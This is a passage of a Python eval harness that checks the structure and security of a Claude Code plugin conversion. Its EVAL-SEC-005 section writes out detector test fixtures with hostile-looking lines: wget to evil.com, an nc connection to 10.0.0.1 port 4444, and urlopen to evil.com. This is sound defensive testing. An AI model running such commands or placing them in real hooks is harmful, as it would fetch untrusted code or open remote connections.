#!/usr/bin/env python3
"""
System2 Eval Harness

Deterministic structural assertions verifying the plugin conversion.
Uses only Python 3.8+ standard library. No external dependencies.

Usage:
    python3 evals/run_evals.py

Exit codes:
    0 - All evals pass
    1 - One or more evals fail
"""

import ast
import difflib
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path
from typing import List, Optional, Tuple

# Make plugin/scripts importable so we can reuse hook_security checks.
_PLUGIN_SCRIPTS = str(Path(__file__).resolve().parent.parent / "plugin" / "scripts")
if _PLUGIN_SCRIPTS not in sys.path:
    sys.path.insert(0, _PLUGIN_SCRIPTS)

from hook_security import check_no_external_deps, check_no_network_calls

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

# Resolve repo root relative to this script's location
SCRIPT_DIR = Path(__file__).resolve().parent
REPO_ROOT = SCRIPT_DIR.parent
GOLDENS_DIR = SCRIPT_DIR / "goldens"
FIXTURES_DIR = SCRIPT_DIR / "fixtures"
PLUGIN_DIR = "plugin"


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def load_golden(name: str) -> dict:
    """Load a golden JSON file from evals/goldens/."""
    path = GOLDENS_DIR / name
    with open(path) as f:
        return json.load(f)


def read_file(rel_path: str) -> str:
    """Read a file relative to repo root. Returns content or empty string if missing."""
    full = REPO_ROOT / rel_path
    if full.is_file():
        return full.read_text(encoding="utf-8", errors="replace")
    return ""


def list_files(rel_dir: str, suffix: str = "") -> List[str]:
    """List filenames in a directory relative to repo root, optionally filtered by suffix."""
    full = REPO_ROOT / rel_dir
    if not full.is_dir():
        return []
    files = [f.name for f in full.iterdir() if f.is_file()]
    if suffix:
        files = [f for f in files if f.endswith(suffix)]
    return sorted(files)


def dir_exists(rel_path: str) -> bool:
    return (REPO_ROOT / rel_path).is_dir()


def file_exists(rel_path: str) -> bool:
    return (REPO_ROOT / rel_path).is_file()


def grep_dir(rel_dir: str, pattern: str, file_suffix: str = "") -> List[Tuple[str, int, str]]:
    """Search files in a directory for a regex pattern. Returns list of (filename, lineno, line)."""
    results = []
    compiled = re.compile(pattern)
    full = REPO_ROOT / rel_dir
    if not full.is_dir():
        return results
    for fpath in sorted(full.rglob("*")):
        if not fpath.is_file():
            continue
        if "__pycache__" in fpath.parts:
            continue
        if file_suffix and not fpath.name.endswith(file_suffix):
            continue
        try:
            lines = fpath.read_text(encoding="utf-8", errors="replace").splitlines()
        except Exception:
            continue
        for i, line in enumerate(lines, 1):
            if compiled.search(line):
                results.append((str(fpath.relative_to(REPO_ROOT)), i, line.strip()))
    return results


def grep_file(rel_path: str, pattern: str) -> List[Tuple[int, str]]:
    """Search a single file for a regex pattern. Returns list of (lineno, line)."""
    results = []
    content = read_file(rel_path)
    if not content:
        return results
    compiled = re.compile(pattern)
    for i, line in enumerate(content.splitlines(), 1):
        if compiled.search(line):
            results.append((i, line.strip()))
    return results


def extract_frontmatter(content: str) -> Optional[str]:
    """Extract YAML frontmatter from a Markdown file (content between first two --- lines)."""
    lines = content.splitlines()
    if not lines or lines[0].strip() != "---":
        return None
    end = -1
    for i in range(1, len(lines)):
        if lines[i].strip() == "---":
            end = i
            break
    if end < 0:
        return None
    return "\n".join(lines[1:end])


# ---------------------------------------------------------------------------
# Result tracking
# ---------------------------------------------------------------------------

class EvalResult:
    def __init__(self, eval_id: str, description: str, passed: bool, message: str = ""):
        self.eval_id = eval_id
        self.description = description
        self.passed = passed
        self.message = message

    def __str__(self):
        status = "PASS" if self.passed else "FAIL"
        msg = f"  [{status}] {self.eval_id}: {self.description}"
        if not self.passed and self.message:
            msg += f"\n         {self.message}"
        return msg


results: List[EvalResult] = []


def record(eval_id: str, description: str, passed: bool, message: str = ""):
    results.append(EvalResult(eval_id, description, passed, message))


# ---------------------------------------------------------------------------
# Eval implementations
# ---------------------------------------------------------------------------

def eval_path_001():
    """EVAL-PATH-001: Zero CLAUDE_PROJECT_DIR occurrences in agents/"""
    hits = grep_dir(f"{PLUGIN_DIR}/agents", r"CLAUDE_PROJECT_DIR")
    record(
        "EVAL-PATH-001",
        "Zero CLAUDE_PROJECT_DIR occurrences in agents/",
        len(hits) == 0,
        f"Found {len(hits)} occurrence(s): {hits[:3]}" if hits else "",
    )


def eval_path_002():
    """EVAL-PATH-002: Zero .claude/hooks or .claude/allowlists paths in agents/"""
    hits = grep_dir(f"{PLUGIN_DIR}/agents", r"\.claude/(hooks|allowlists)")
    record(
        "EVAL-PATH-002",
        "Zero .claude/(hooks|allowlists) paths in agents/",
        len(hits) == 0,
        f"Found {len(hits)} occurrence(s): {hits[:3]}" if hits else "",
    )


def eval_path_003():
    """EVAL-PATH-003: All hook commands use CLAUDE_PLUGIN_ROOT/hooks/"""
    golden = load_golden("agent_inventory.json")
    missing = []
    for filename in golden["agents"]:
        content = read_file(f"{PLUGIN_DIR}/agents/{filename}")
        fm = extract_frontmatter(content)
        if fm is None:
            missing.append(f"{filename}: no frontmatter")
            continue
        # Every agent has at least one hook referencing hooks/
        if "CLAUDE_PLUGIN_ROOT" not in fm:
            # code-reviewer still references hooks via CLAUDE_PLUGIN_ROOT
            missing.append(f"{filename}: no CLAUDE_PLUGIN_ROOT in frontmatter")
        elif 'CLAUDE_PLUGIN_ROOT}/hooks/' not in fm:
            missing.append(f"{filename}: CLAUDE_PLUGIN_ROOT present but no /hooks/ path")
    record(
        "EVAL-PATH-003",
        "All agent hook commands use CLAUDE_PLUGIN_ROOT/hooks/",
        len(missing) == 0,
        "; ".join(missing) if missing else "",
    )


def eval_path_004():
    """EVAL-PATH-004: All allowlist args use CLAUDE_PLUGIN_ROOT/allowlists/"""
    golden = load_golden("agent_allowlist_bindings.json")
    missing = []
    for agent_name, allowlist_file in golden["bindings"].items():
        filename = f"{agent_name}.md"
        content = read_file(f"{PLUGIN_DIR}/agents/{filename}")
        fm = extract_frontmatter(content)
        if fm is None:
            missing.append(f"{filename}: no frontmatter")
            continue
        expected_fragment = f"CLAUDE_PLUGIN_ROOT}}/allowlists/{allowlist_file}"
        if expected_fragment not in fm:
            missing.append(f"{filename}: expected allowlist ref to {allowlist_file}")
    # Agents without allowlist should NOT have allowlist references
    for agent_name in golden["agents_without_allowlist"]:
        filename = f"{agent_name}.md"
        content = read_file(f"{PLUGIN_DIR}/agents/{filename}")
        fm = extract_frontmatter(content) or ""
        if "allowlists/" in fm:
            missing.append(f"{filename}: should not reference allowlists/ but does")
    record(
        "EVAL-PATH-004",
        "All allowlist args use CLAUDE_PLUGIN_ROOT/allowlists/ with correct file",
        len(missing) == 0,
        "; ".join(missing) if missing else "",
    )


def eval_path_005():
    """EVAL-PATH-005: Hook command quoting follows expected pattern"""
    # Pattern: '...  "${CLAUDE_PLUGIN_ROOT}/hooks/...'  (double quote around variable+path)
    golden = load_golden("agent_inventory.json")
    bad_quoting = []
    expected_pattern = re.compile(r'"\$\{CLAUDE_PLUGIN_ROOT\}/(?:hooks|allowlists)/[^"]*"')
    for filename in golden["agents"]:
        content = read_file(f"{PLUGIN_DIR}/agents/{filename}")
        fm = extract_frontmatter(content)
        if fm is None:
            continue
        for line in fm.splitlines():
            if "CLAUDE_PLUGIN_ROOT" in line and "command:" in line:
                # Check that the variable is properly wrapped in braces and double-quoted
                if "${CLAUDE_PLUGIN_ROOT}" not in line:
                    bad_quoting.append(f"{filename}: missing braces in CLAUDE_PLUGIN_ROOT")
                elif not expected_pattern.search(line):
                    bad_quoting.append(f"{filename}: unexpected quoting: {line.strip()}")
    record(
        "EVAL-PATH-005",
        'Hook command quoting uses "${CLAUDE_PLUGIN_ROOT}/..." pattern',
        len(bad_quoting) == 0,
        "; ".join(bad_quoting[:5]) if bad_quoting else "",
    )


def eval_inv_001():
    """EVAL-INV-001: Exactly 13 named agent .md files in agents/"""
    golden = load_golden("agent_inventory.json")
    expected = set(golden["agents"].keys())
    actual = set(list_files(f"{PLUGIN_DIR}/agents", ".md"))
    missing = expected - actual
    extra = actual - expected
    record(
        "EVAL-INV-001",
        f"Exactly {golden['expected_count']} agent .md files in agents/",
        missing == set() and extra == set() and len(actual) == golden["expected_count"],
        f"missing={sorted(missing)}, extra={sorted(extra)}, count={len(actual)}"
        if missing or extra or len(actual) != golden["expected_count"]
        else "",
    )


def eval_inv_002():
    """EVAL-INV-002: Zero .md files in .claude/agents/"""
    stale = list_files(".claude/agents", ".md")
    record(
        "EVAL-INV-002",
        "Zero .md files in .claude/agents/",
        len(stale) == 0,
        f"Found {len(stale)} stale file(s): {stale}" if stale else "",
    )


def eval_inv_003():
    """EVAL-INV-003: Correct hook file counts in hooks/"""
    golden = load_golden("hook_inventory.json")
    actual_py = set(list_files(f"{PLUGIN_DIR}/hooks", ".py"))
    actual_regex = set(list_files(f"{PLUGIN_DIR}/hooks", ".regex"))
    expected_py = set(golden["python_files"])
    expected_regex = set(golden["regex_files"])
    missing_py = expected_py - actual_py
    extra_py = actual_py - expected_py
    missing_regex = expected_regex - actual_regex
    extra_regex = actual_regex - expected_regex
    ok = (
        len(actual_py) == golden["expected_py_count"]
        and len(actual_regex) == golden["expected_regex_count"]
        and not missing_py
        and not extra_py
        and not missing_regex
        and not extra_regex
    )
    msg_parts = []
    if missing_py:
        msg_parts.append(f"missing py: {sorted(missing_py)}")
    if extra_py:
        msg_parts.append(f"extra py: {sorted(extra_py)}")
    if missing_regex:
        msg_parts.append(f"missing regex: {sorted(missing_regex)}")
    if extra_regex:
        msg_parts.append(f"extra regex: {sorted(extra_regex)}")
    record(
        "EVAL-INV-003",
        f"{golden['expected_py_count']} .py and {golden['expected_regex_count']} .regex files in hooks/",
        ok,
        "; ".join(msg_parts) if msg_parts else "",
    )


def eval_inv_004():
    """EVAL-INV-004: Correct allowlist file count in allowlists/"""
    golden = load_golden("allowlist_inventory.json")
    actual = set(list_files(f"{PLUGIN_DIR}/allowlists", ".regex"))
    expected = set(golden["files"])
    missing = expected - actual
    extra = actual - expected
    record(
        "EVAL-INV-004",
        f"Exactly {golden['expected_count']} .regex files in allowlists/",
        len(actual) == golden["expected_count"] and not missing,
        f"missing={sorted(missing)}, extra={sorted(extra)}, count={len(actual)}"
        if missing or extra or len(actual) != golden["expected_count"]
        else "",
    )


def eval_inv_005():
    """EVAL-INV-005: hooks/hooks.json does NOT exist"""
    exists = file_exists(f"{PLUGIN_DIR}/hooks/hooks.json")
    record(
        "EVAL-INV-005",
        "plugin/hooks/hooks.json does NOT exist",
        not exists,
        "plugin/hooks/hooks.json exists but should not" if exists else "",
    )


def eval_man_001():
    """EVAL-MAN-001: plugin.json valid JSON with correct fields"""
    golden = load_golden("manifest_schemas.json")
    path = golden["plugin_json"]["path"]
    errors = []
    content = read_file(path)
    if not content:
        errors.append(f"{path} does not exist or is empty")
    else:
        try:
            data = json.loads(content)
        except json.JSONDecodeError as e:
            errors.append(f"{path} is not valid JSON: {e}")
            data = None
        if data is not None:
            for field in golden["plugin_json"]["required_field_names"]:
                if field not in data:
                    errors.append(f"missing field: {field}")
            for field, expected in golden["plugin_json"]["required_fields"].items():
                # Support dotted keys for nested access (e.g. "author.name")
                parts = field.split(".")
                actual = data
                for part in parts:
                    actual = actual.get(part) if isinstance(actual, dict) else None
                if actual != expected:
                    errors.append(f"{field}: expected {expected!r}, got {actual!r}")
    record(
        "EVAL-MAN-001",
        "plugin.json valid JSON with correct fields",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_man_002():
    """EVAL-MAN-002: marketplace.json valid JSON with correct fields"""
    golden = load_golden("manifest_schemas.json")
    path = golden["marketplace_json"]["path"]
    errors = []
    content = read_file(path)
    if not content:
        errors.append(f"{path} does not exist or is empty")
    else:
        try:
            data = json.loads(content)
        except json.JSONDecodeError as e:
            errors.append(f"{path} is not valid JSON: {e}")
            data = None
        if data is not None:
            for field in golden["marketplace_json"]["required_field_names"]:
                if field not in data:
                    errors.append(f"missing field: {field}")
            for field, expected in golden["marketplace_json"]["required_fields"].items():
                actual = data.get(field)
                if actual != expected:
                    errors.append(f"{field}: expected {expected!r}, got {actual!r}")
            plugins = data.get("plugins", [])
            if not plugins:
                errors.append("plugins array is empty")
            elif plugins[0].get("source") != golden["marketplace_json"]["plugins_first_entry"]["source"]:
                errors.append(
                    f"plugins[0].source: expected {golden['marketplace_json']['plugins_first_entry']['source']!r}, "
                    f"got {plugins[0].get('source')!r}"
                )
    record(
        "EVAL-MAN-002",
        "marketplace.json valid JSON with correct fields",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_man_003():
    """EVAL-MAN-003: VERSION file matches plugin.json version"""
    golden = load_golden("manifest_schemas.json")
    version_content = read_file("VERSION").strip()
    plugin_content = read_file(golden["plugin_json"]["path"])
    errors = []
    if version_content != golden["version_file"]["expected_content"]:
        errors.append(f"VERSION: expected {golden['version_file']['expected_content']!r}, got {version_content!r}")
    try:
        plugin_data = json.loads(plugin_content) if plugin_content else {}
        plugin_version = plugin_data.get("version", "")
    except json.JSONDecodeError:
        plugin_version = ""
        errors.append("plugin.json is not valid JSON")
    if version_content != plugin_version:
        errors.append(f"VERSION ({version_content!r}) != plugin.json version ({plugin_version!r})")
    record(
        "EVAL-MAN-003",
        "VERSION file matches plugin.json version",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_tpl_001():
    """EVAL-TPL-001: skills/init/SKILL.md template content matches CLAUDE.md"""
    init_content = read_file(f"{PLUGIN_DIR}/skills/init/SKILL.md")
    claude_content = read_file("CLAUDE.md").strip()
    errors = []
    if not init_content:
        errors.append("skills/init/SKILL.md does not exist or is empty")
    elif not claude_content:
        errors.append("CLAUDE.md does not exist or is empty")
    else:
        # Extract template between markers
        begin_marker = "---BEGIN TEMPLATE---"
        end_marker = "---END TEMPLATE---"
        begin_idx = init_content.find(begin_marker)
        end_idx = init_content.find(end_marker)
        if begin_idx < 0:
            errors.append(f"skills/init/SKILL.md missing '{begin_marker}' marker")
        elif end_idx < 0:
            errors.append(f"skills/init/SKILL.md missing '{end_marker}' marker")
        else:
            template = init_content[begin_idx + len(begin_marker):end_idx].strip()
            if template != claude_content:
                # Find first difference for diagnostics
                t_lines = template.splitlines()
                c_lines = claude_content.splitlines()
                for i, (t, c) in enumerate(zip(t_lines, c_lines)):
                    if t != c:
                        errors.append(
                            f"First diff at line {i+1}: "
                            f"template={t[:80]!r}... vs CLAUDE.md={c[:80]!r}..."
                        )
                        break
                else:
                    if len(t_lines) != len(c_lines):
                        errors.append(
                            f"Line count mismatch: template={len(t_lines)}, CLAUDE.md={len(c_lines)}"
                        )
    record(
        "EVAL-TPL-001",
        "skills/init/SKILL.md template == CLAUDE.md content",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_tpl_002():
    """EVAL-TPL-002: No .claude/agents/ path in CLAUDE.md or template"""
    errors = []
    for path in ["CLAUDE.md", f"{PLUGIN_DIR}/skills/init/SKILL.md"]:
        hits = grep_file(path, r"\.claude/agents/")
        if hits:
            errors.append(f"{path}: {len(hits)} occurrence(s) at line(s) {[h[0] for h in hits]}")
    record(
        "EVAL-TPL-002",
        "No .claude/agents/ path in CLAUDE.md or init template",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_tpl_003():
    """EVAL-TPL-003: Template contains all required section headings"""
    golden = load_golden("template_sections.json")
    content = read_file(f"{PLUGIN_DIR}/skills/init/SKILL.md")
    missing = []
    for heading in golden["required_headings"]:
        if heading not in content:
            missing.append(heading)
    record(
        "EVAL-TPL-003",
        "Template contains all required section headings",
        len(missing) == 0,
        f"Missing headings: {missing}" if missing else "",
    )


def eval_orc_001():
    """EVAL-ORC-001: Delegation map names match agent filenames"""
    golden = load_golden("delegation_map.json")
    agent_files = list_files(f"{PLUGIN_DIR}/agents", ".md")
    agent_names_from_files = sorted(f.replace(".md", "") for f in agent_files)
    delegation_names = sorted(golden["delegation_order"])
    missing_in_files = set(delegation_names) - set(agent_names_from_files)
    missing_in_map = set(agent_names_from_files) - set(delegation_names)
    errors = []
    if missing_in_files:
        errors.append(f"In delegation map but no file: {sorted(missing_in_files)}")
    if missing_in_map:
        errors.append(f"File exists but not in delegation map: {sorted(missing_in_map)}")
    record(
        "EVAL-ORC-001",
        "Delegation map names match agent filenames",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_orc_002():
    """EVAL-ORC-002: Agent frontmatter name: field matches filename"""
    golden = load_golden("agent_inventory.json")
    errors = []
    for filename, expected_name in golden["agents"].items():
        content = read_file(f"{PLUGIN_DIR}/agents/{filename}")
        fm = extract_frontmatter(content)
        if fm is None:
            errors.append(f"{filename}: no frontmatter found")
            continue
        # Find name: field
        name_match = re.search(r"^name:\s*(.+)$", fm, re.MULTILINE)
        if not name_match:
            errors.append(f"{filename}: no 'name:' field in frontmatter")
        else:
            actual_name = name_match.group(1).strip()
            if actual_name != expected_name:
                errors.append(f"{filename}: name={actual_name!r}, expected={expected_name!r}")
    record(
        "EVAL-ORC-002",
        "Agent frontmatter name: matches filename",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_orc_003():
    """EVAL-ORC-003: Agent allowlist bindings match design spec"""
    golden = load_golden("agent_allowlist_bindings.json")
    errors = []
    for agent_name, expected_allowlist in golden["bindings"].items():
        filename = f"{agent_name}.md"
        content = read_file(f"{PLUGIN_DIR}/agents/{filename}")
        fm = extract_frontmatter(content)
        if fm is None:
            errors.append(f"{filename}: no frontmatter")
            continue
        # Look for the allowlist reference
        pattern = r"allowlists/(\S+\.regex)"
        matches = re.findall(pattern, fm)
        # Remove trailing quote marks from matches
        matches = [m.rstrip('"\'') for m in matches]
        if expected_allowlist not in matches:
            errors.append(
                f"{agent_name}: expected allowlist {expected_allowlist!r}, found {matches}"
            )
    record(
        "EVAL-ORC-003",
        "Agent allowlist bindings match design spec",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_cln_001():
    """EVAL-CLN-001: Deleted infrastructure files do not exist"""
    must_not_exist = [
        ("manifest.json", "file"),
        (".system2", "dir"),
        (".claude/commands/update-system2.md", "file"),
        ("scripts", "dir"),
        ("tests", "dir"),
    ]
    still_exist = []
    for path, kind in must_not_exist:
        if kind == "file" and file_exists(path):
            still_exist.append(path)
        elif kind == "dir" and dir_exists(path):
            still_exist.append(path + "/")
    record(
        "EVAL-CLN-001",
        "Deleted infrastructure files/dirs do not exist",
        len(still_exist) == 0,
        f"Still exist: {still_exist}" if still_exist else "",
    )


def eval_cln_002():
    """EVAL-CLN-002: No .system2/ entries in .gitignore"""
    hits = grep_file(".gitignore", r"\.system2/")
    record(
        "EVAL-CLN-002",
        "No .system2/ entries in .gitignore",
        len(hits) == 0,
        f"Found {len(hits)} .system2/ entries" if hits else "",
    )


def eval_cln_003():
    """EVAL-CLN-003: spec*/ pattern in .gitignore"""
    hits = grep_file(".gitignore", r"spec\*/")
    record(
        "EVAL-CLN-003",
        "spec*/ pattern preserved in .gitignore",
        len(hits) > 0,
        "spec*/ pattern not found in .gitignore" if not hits else "",
    )


def eval_doc_001():
    """EVAL-DOC-001: README has required patterns, no prohibited patterns"""
    golden = load_golden("required_readme_patterns.json")
    errors = []
    readme = read_file("README.md")
    if not readme:
        errors.append("README.md does not exist or is empty")
    else:
        for rule in golden["must_contain"]:
            pattern = rule["pattern"]
            is_regex = rule.get("is_regex", False)
            if is_regex:
                if not re.search(pattern, readme):
                    errors.append(f"must_contain: {rule['id']} -- pattern {pattern!r} not found")
            else:
                if pattern not in readme:
                    errors.append(f"must_contain: {rule['id']} -- {pattern!r} not found")
        for rule in golden["must_not_contain"]:
            pattern = rule["pattern"]
            is_regex = rule.get("is_regex", False)
            if is_regex:
                if re.search(pattern, readme):
                    errors.append(f"must_not_contain: {rule['id']} -- pattern {pattern!r} found")
            else:
                if pattern in readme:
                    errors.append(f"must_not_contain: {rule['id']} -- {pattern!r} found")
    record(
        "EVAL-DOC-001",
        "README has required patterns, no prohibited patterns",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_doc_002():
    """EVAL-DOC-002: No REQ- IDs in implementation files"""
    golden = load_golden("prohibited_patterns.json")
    errors = []
    for rule in golden["rules"]:
        if not rule["id"].startswith("no-req-ids"):
            continue
        scope = rule["scope"]
        pattern = rule["pattern"]
        exclude_files = set(rule.get("exclude_files", []))
        if scope.endswith("/"):
            hits = grep_dir(scope.rstrip("/"), pattern)
            # Filter out excluded files
            if exclude_files:
                hits = [h for h in hits if h[0] not in exclude_files]
        else:
            if scope in exclude_files:
                continue
            hits = grep_file(scope, pattern)
        if hits:
            if isinstance(hits[0], tuple) and len(hits[0]) == 3:
                locations = [f"{h[0]}:{h[1]}" for h in hits[:3]]
            else:
                locations = [f"line {h[0]}" for h in hits[:3]]
            errors.append(f"{rule['id']} in {scope}: {len(hits)} hit(s) at {locations}")
    record(
        "EVAL-DOC-002",
        "No REQ- IDs in implementation files",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_sec_001():
    """EVAL-SEC-001: No non-stdlib imports in hook scripts"""
    errors = []
    hook_dir = REPO_ROOT / PLUGIN_DIR / "hooks"
    if hook_dir.is_dir():
        for fpath in sorted(hook_dir.glob("*.py")):
            errors.extend(check_no_external_deps(str(fpath)))
    record(
        "EVAL-SEC-001",
        "No non-stdlib imports in hook scripts",
        len(errors) == 0,
        "; ".join(errors[:5]) if errors else "",
    )


def eval_sec_002():
    """EVAL-SEC-002: No network calls in hook scripts"""
    errors = []
    hook_dir = REPO_ROOT / PLUGIN_DIR / "hooks"
    if hook_dir.is_dir():
        for fpath in sorted(hook_dir.glob("*.py")):
            errors.extend(check_no_network_calls(str(fpath)))
    record(
        "EVAL-SEC-002",
        "No network calls in hook scripts",
        len(errors) == 0,
        f"Found network call patterns: {errors[:3]}" if errors else "",
    )


def eval_sec_003():
    """EVAL-SEC-003: Safety instruction present in CLAUDE.md and template"""
    errors = []
    for path in ["CLAUDE.md", f"{PLUGIN_DIR}/skills/init/SKILL.md"]:
        content = read_file(path)
        if "untrusted input" not in content:
            errors.append(f"{path}: 'untrusted input' safety instruction not found")
    record(
        "EVAL-SEC-003",
        "Safety instruction present in CLAUDE.md and template",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_sec_004():
    """EVAL-SEC-004: All allowlist .regex files contain valid regex"""
    errors = []
    allowlist_dir = REPO_ROOT / PLUGIN_DIR / "allowlists"
    if allowlist_dir.is_dir():
        for fpath in sorted(allowlist_dir.glob("*.regex")):
            content = fpath.read_text(encoding="utf-8", errors="replace").strip()
            if not content:
                errors.append(f"{fpath.name}: empty file")
                continue
            # Combine non-comment, non-blank lines with | (same logic as validate-file-paths.py)
            lines = [
                line.strip()
                for line in content.splitlines()
                if line.strip() and not line.strip().startswith("#")
            ]
            if not lines:
                errors.append(f"{fpath.name}: no active patterns")
                continue
            combined = "|".join(lines)
            try:
                re.compile(combined)
            except re.error as e:
                errors.append(f"{fpath.name}: invalid regex: {e}")
    else:
        errors.append(f"{PLUGIN_DIR}/allowlists/ directory not found")
    record(
        "EVAL-SEC-004",
        "All allowlist .regex files contain valid regex",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_sec_005():
    """EVAL-SEC-005: Overlay hook security catches process execution and dynamic imports"""
    from hook_security import check_no_banned_overlay_modules
    errors = []

    test_cases = [
        # os.system / os.popen
        ("os_system.py", 'import os\nos.system("curl https://example.com")\n'),
        ("os_popen.py", 'import os\nos.popen("wget http://evil.com")\n'),
        ("os_aliased.py", 'import os as o\no.system("nc 10.0.0.1 4444")\n'),
        ("from_os_system.py", 'from os import system\nsystem("curl https://example.com")\n'),
        # __import__
        ("dunder_import_subprocess.py", '__import__("subprocess").run(["curl", "..."])\n'),
        ("dunder_import_urllib.py",
         '__import__("urllib.request", fromlist=["urlopen"]).urlopen("http://evil.com")\n'),
        # importlib.import_module
        ("importlib_import.py", 'import importlib\nimportlib.import_module("subprocess")\n'),
        ("importlib_aliased.py", 'import importlib as il\nil.import_module("requests")\n'),
        ("from_importlib.py", 'from importlib import import_module\nimport_module("subprocess")\n'),
        # exec / eval
        ("exec_import.py", "exec(\"import subprocess\")\n"),
        ("eval_import.py", "eval(\"__import__('subprocess')\")\n"),
    ]

    for name, code in test_cases:
        tmpdir = tempfile.mkdtemp(prefix="eval-sec-005-")
        try:
            hook_path = os.path.join(tmpdir, name)
            with open(hook_path, "w") as f:
                f.write(code)
            violations = check_no_banned_overlay_modules(hook_path)
            if not violations:
                errors.append(f"{name}: expected violation but got none")
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)

    # Negative: safe stdlib usage should not trigger.
    safe_cases = [
        ("safe_os.py", 'import os\nresult = os.path.join("/a", "b")\n'),
        ("safe_json.py", 'import json\njson.dumps({"key": "val"})\n'),
    ]
    for name, code in safe_cases:
        tmpdir = tempfile.mkdtemp(prefix="eval-sec-005-neg-")
        try:
            hook_path = os.path.join(tmpdir, name)
            with open(hook_path, "w") as f:
                f.write(code)
            violations = check_no_banned_overlay_modules(hook_path)
            if violations:
                errors.append(f"{name}: safe code flagged: {violations}")
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)

    record(
        "EVAL-SEC-005",
        "Overlay hook security catches process exec and dynamic imports",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


def eval_sec_006():
    """EVAL-SEC-006: Rollback cleans up parent directories created by composition"""
    errors = []
    tmpdir = tempfile.mkdtemp(prefix="eval-sec-006-")
    try:
        from composer import _makedirs_tracked

        nested = os.path.join(tmpdir, "a", "b", "c")
        dirs_created: list = []
        _makedirs_tracked(nested, dirs_created)

        if not os.path.isdir(nested):
            errors.append("_makedirs_tracked did not create directory")
        if len(dirs_created) < 3:
            errors.append(
                f"expected 3 levels tracked, got {len(dirs_created)}: {dirs_created}"
            )

        # Simulate rollback: remove in recorded order (deepest first).
        for d in dirs_created:
            try:
                os.rmdir(d)
            except OSError:
                pass

        remaining = os.path.join(tmpdir, "a")
        if os.path.isdir(remaining):
            errors.append(
                f"parent directory {remaining} survived rollback"
            )
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)

    record(
        "EVAL-SEC-006",
        "Rollback cleans up parent directories",
        len(errors) == 0,
        "; ".join(errors) if errors else "",
    )


# ---------------------------------------------------------------------------
# Maintenance eval helpers
# ---------------------------------------------------------------------------

def _load_fixture_snapshots() -> List[str]:
    """Return the ordered list of snapshot names from the anti-slop-sequence fixture metadata."""
    meta_path = FIXTURES_DIR / "anti-slop-sequence" / "metadata.json"
    with open(meta_path) as f:
        meta = json.load(f)
    return meta["snapshots"]


def _read_fixture_file(snapshot: str, filename: str) -> str:
    """Read a file from a fixture snapshot directory."""
    path = FIXTURES_DIR / "anti-slop-sequence" / snapshot / filename
    if path.is_file():
        return path.read_text(encoding="utf-8", errors="replace")
    return ""


def _compute_diff_lines(snapshot_a: str, snapshot_b: str) -> int:
    """Count the total number of changed lines between two fixture snapshots.

    Compares all files present in either snapshot and sums the number of
    added/removed lines across all files.
    """
    dir_a = FIXTURES_DIR / "anti-slop-sequence" / snapshot_a
    dir_b = FIXTURES_DIR / "anti-slop-sequence" / snapshot_b
    all_files: set = set()
    for d in (dir_a, dir_b):
        if d.is_dir():
            all_files.update(f.name for f in d.iterdir() if f.is_file())
    total = 0
    for fname in sorted(all_files):
        content_a = _read_fixture_file(snapshot_a, fname)
        content_b = _read_fixture_file(snapshot_b, fname)
        lines_a = content_a.splitlines()
        lines_b = content_b.splitlines()
        diff = list(difflib.unified_diff(lines_a, lines_b))
        # Count lines that start with + or - but not the header lines (+++/---)
        for line in diff:
            if (line.startswith("+") and not line.startswith("+++")) or \
               (line.startswith("-") and not line.startswith("---")):
                total += 1
    return total


def _extract_public_exports(content: str) -> List[str]:
    """Extract public function and class names from Python source content.

    Public exports are top-level ``def`` or ``class`` definitions whose name
    does not start with an underscore.
    """
    exports = []
    pattern = re.compile(r"^(?:def|class)\s+([A-Za-z_][A-Za-z0-9_]*)")
    for line in content.splitlines():
        m = pattern.match(line)
        if m and not m.group(1).startswith("_"):
            exports.append(m.group(1))
    return exports


def _extract_test_functions(content: str) -> List[str]:
    """Extract test method names (def test_*) from test file content."""
    funcs = []
    pattern = re.compile(r"^\s+def\s+(test_[A-Za-z0-9_]+)")
    for line in content.splitlines():
        m = pattern.match(line)
        if m:
            funcs.append(m.group(1))
    return funcs


# ---------------------------------------------------------------------------
# Maintenance eval implementations
# ---------------------------------------------------------------------------

def eval_maint_001():
    """EVAL-MAINT-001: Diff-size growth ratio within threshold"""
    try:
        thresholds = load_golden("maintenance_thresholds.json")
        max_ratio = thresholds["diff_size_growth_max_ratio"]
        snapshots = _load_fixture_snapshots()
    except FileNotFoundError as e:
        record("EVAL-MAINT-001", "Diff-size growth ratio within threshold", False,
               f"Fixture or golden file not found: {e}")
        return

    # Compute diff sizes between consecutive snapshots
    diff_sizes = []
    for i in range(len(snapshots) - 1):
        size = _compute_diff_lines(snapshots[i], snapshots[i + 1])
        diff_sizes.append((snapshots[i], snapshots[i + 1], size))

    # Check growth ratios starting from the second transition
    violations = []
    for i in range(1, len(diff_sizes)):
        prev_label = f"{diff_sizes[i-1][0]}->{diff_sizes[i-1][1]}"
        curr_label = f"{diff_sizes[i][0]}->{diff_sizes[i][1]}"
        prev_size = diff_sizes[i - 1][2]
        curr_size = diff_sizes[i][2]
        if prev_size == 0:
            # Avoid division by zero; if previous diff was empty, any non-zero diff is infinite growth
            if curr_size > 0:
                violations.append(
                    f"{curr_label}: diff={curr_size} but prior diff ({prev_label}) was 0"
                )
            continue
        ratio = curr_size / prev_size
        if ratio > max_ratio:
            violations.append(
                f"{curr_label}: ratio={ratio:.2f} (diff={curr_size} vs prior {prev_label} diff={prev_size}), "
                f"max allowed={max_ratio}"
